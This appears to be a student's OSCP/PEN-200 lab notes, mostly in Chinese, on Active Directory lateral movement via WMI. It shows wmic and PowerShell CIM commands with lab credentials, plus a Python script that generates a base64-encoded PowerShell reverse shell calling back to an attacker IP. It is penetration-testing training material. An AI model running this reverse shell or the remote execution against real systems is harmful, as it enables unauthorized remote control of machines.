---
title: '[OSCP, PEN-200] Instructional notes - Part 7'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 7
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 6](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md) 內容

# Lateral Movement in Active Directory
前章節收集了密碼 Hash 值，並利用現有 ticket 進行 Kerberos 驗證。
再來將使用 Lateral Movement 技術來攻擊 high-value domain users 的機器。
>[!Tip]
>1. Kerberos 與 NTLM 認證機制並不直接使用明文密碼，因此單純破解可能並不適用。
>2. Microsoft 的 native tools 也不支援利用密碼雜湊直接進行認證

## Active Directory Lateral Movement Techniques
有關 Active Directory Domain 的技巧在 Lateral Movement 階段仍然有用，可能因此獲得先前未被發現的網路的存取權
### WMI and WinRM
WMI（Windows Management Instrumentation） 和 WinRM（Windows Remote Management） 作為 Active Directory Lateral Movement 技術的工具
>[!Note]
>**[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI):**\
>Windows 內建的一種 object-oriented 管理架構，可以用來管理系統資源、查詢資訊，以及遠端執行命令。它透過 RPC（[Remote Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)）進行通訊，使用 TCP 135 連接遠端系統，並使用 高範圍連接埠（19152-65535） 來傳輸資料。\
WMI 允許透過 Win32_Process 類別 來建立新的 process，這使得 attacker 可以利用它來在目標系統上執行任意指令。

#### WMI 橫向移動攻擊
使用 wmic（Windows Management Instrumentation Command-line tool） 來在遠端目標機器上建立新的 process。雖然 wmic 已被微軟棄用，但仍可用於老舊環境。此外，攻擊者也可以改用 PowerShell 來達成相同效果。

將以用戶 jen 的身分執行攻擊，jen 既是 domain user，也是目標電腦的 Local Administrator group member。
#### 1. 使用 wmic 遠端執行 calc.exe
使用 Jeff RDP 登入
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
```
透過 wmic 來在遠端機器 FILES04（192.168.144.73） 上開啟計算機（calc.exe）：
```
PS C:\Users\jeff> wmic /node:192.168.144.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2332;
        ReturnValue = 0;
};
```
>`ProcessId = 2332;`: 表示成功建立了一個新 process\
`ReturnValue = 0;`: 表示命令成功執行

在遠端機器的 工作管理員 中，會看到 `win32calc.exe` 以使用者 jen 身份運行。\
(jen RDP: Task Manager)\
![image](https://hackmd.io/_uploads/SyySXf1hJg.png)


>[!Note]Info
>System processes and services always run in [session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.
#### 2. 使用 PowerShell 透過 WMI 執行命令
(1) 建立 [PSCredential](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) Object 來儲存我們的 session username 和 password。\
PowerShell 需要將密碼轉換為 SecureString 來存儲
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
(2) 建立 WMI 連線:\
使用 [New-Cimsession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) 來與遠端機器建立 session
```
PS C:\Users\jeff> $options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $session = New-Cimsession -ComputerName 192.168.144.73 -Credential $credential -SessionOption $Options 
PS C:\Users\jeff> $command = 'calc';
```
(3) 執行遠端指令
```
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4876           0 192.168.144.73
```
>`ProcessId = 3712;` 代表成功建立新 process\
`ReturnValue = 0;` 代表指令執行成功
>> 在 FILES04 上會啟動 calc.exe，證明橫向移動成功。

(jen RDP: Task Manager)\
![image](https://hackmd.io/_uploads/ByFO7z13yx.png)

#### 3. WMI Reverse Shell
可以不只開啟 `calc.exe`，還能執行 Reverse Shell，讓遠端目標機器回連攻擊者的 Kali Linux，提供完整的控制權限。
```py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.159",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
```
┌──(chw㉿CHW)-[~/Tools]
└─$ python3 WMI_reverseshell.py 
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABi
```
